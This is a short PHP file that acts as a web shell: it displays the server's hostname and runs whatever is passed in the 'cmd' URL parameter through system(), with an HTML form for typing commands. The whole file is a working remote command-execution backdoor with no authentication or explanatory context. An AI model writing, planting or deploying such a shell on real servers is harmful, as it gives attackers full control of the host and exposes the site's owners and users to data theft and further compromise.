<?php

echo "Welcome on <b>" . gethostname() . "</b><br><br>";

if (isset($_GET['cmd']) && !empty($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>

<form method="GET" action="">
<input type="text" name="cmd">
<input type="submit">
</form>
